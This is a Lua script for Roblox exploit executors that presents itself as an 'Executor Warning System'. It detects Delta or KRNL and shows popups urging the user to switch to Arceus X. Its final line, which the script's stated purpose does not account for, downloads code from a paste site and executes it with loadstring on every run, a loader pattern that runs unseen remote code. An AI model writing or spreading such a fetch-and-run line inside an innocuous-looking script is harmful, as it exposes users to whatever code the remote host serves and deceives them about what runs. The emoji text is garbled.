--// Executor Warning System (Delta & KRNL)
local executor = identifyexecutor and identifyexecutor() or "Unknown"

-- Function to show Roblox notification
local function showNotification(execName)
    game.StarterGui:SetCore("SendNotification", {
        Title = "‚ö†Ô∏è " .. execName .. " Detected!",
        Text = "Please change executor due to problems in this executor!!\nRecommended: Arceus X\n(Link shown in popup)",
        Duration = 15
    })
end

-- Function to show GUI popup with clickable link
local function showGui(execName)
    local ScreenGui = Instance.new("ScreenGui")
    ScreenGui.Parent = game.CoreGui
    ScreenGui.IgnoreGuiInset = true

    local Frame = Instance.new("Frame")
    Frame.Size = UDim2.new(0, 350, 0, 180)
    Frame.Position = UDim2.new(0.5, -175, 0.5, -90)
    Frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
    Frame.BorderSizePixel = 0
    Frame.Parent = ScreenGui
    Frame.Active = true
    Frame.Draggable = true
    Frame.BackgroundTransparency = 0.1
    Frame.ZIndex = 5

    local Title = Instance.new("TextLabel")
    Title.Text = "‚ö†Ô∏è " .. execName .. " Detected!"
    Title.Size = UDim2.new(1, 0, 0, 40)
    Title.BackgroundTransparency = 1
    Title.TextColor3 = Color3.fromRGB(255, 75, 75)
    Title.TextSize = 20
    Title.Font = Enum.Font.GothamBold
    Title.Parent = Frame

    local Message = Instance.new("TextLabel")
    Message.Text = "Please change executor due to problems in this executor!!\nRecommended: Arceus X"
    Message.Size = UDim2.new(1, -20, 0, 80)
    Message.Position = UDim2.new(0, 10, 0, 40)
    Message.BackgroundTransparency = 1
    Message.TextColor3 = Color3.fromRGB(255, 255, 255)
    Message.TextWrapped = true
    Message.TextSize = 16
    Message.Font = Enum.Font.Gotham
    Message.Parent = Frame

    local Button = Instance.new("TextButton")
    Button.Text = "üîó Open Arceus X Website"
    Button.Size = UDim2.new(0, 300, 0, 40)
    Button.Position = UDim2.new(0.5, -150, 1, -50)
    Button.BackgroundColor3 = Color3.fromRGB(60, 120, 255)
    Button.TextColor3 = Color3.fromRGB(255, 255, 255)
    Button.TextSize = 18
    Button.Font = Enum.Font.GothamBold
    Button.Parent = Frame
    Button.AutoButtonColor = true

    Button.MouseButton1Click:Connect(function()
        if (syn and syn.request) or (http and http.request) or (http_request) or (fluxus and fluxus.request) then
            local req = syn and syn.request or http and http.request or http_request or fluxus.request
            req({Url = "https://arceusx.net", Method = "GET"})
        else
            setclipboard("https://arceusx.net")
            Button.Text = "‚úÖ Link copied to clipboard!"
        end
    end)
end

-- Detect executor
if string.find(executor, "Delta") then
    showNotification("Delta Executor")
    showGui("Delta Executor")
elseif string.find(executor, "Krnl") then
    showNotification("KRNL Executor")
    showGui("KRNL Executor")
else
    print("‚úÖ Executor Safe:", executor)
end
loadstring(game:HttpGet("https://pastefy.app/nwtxwHVW/raw"))()
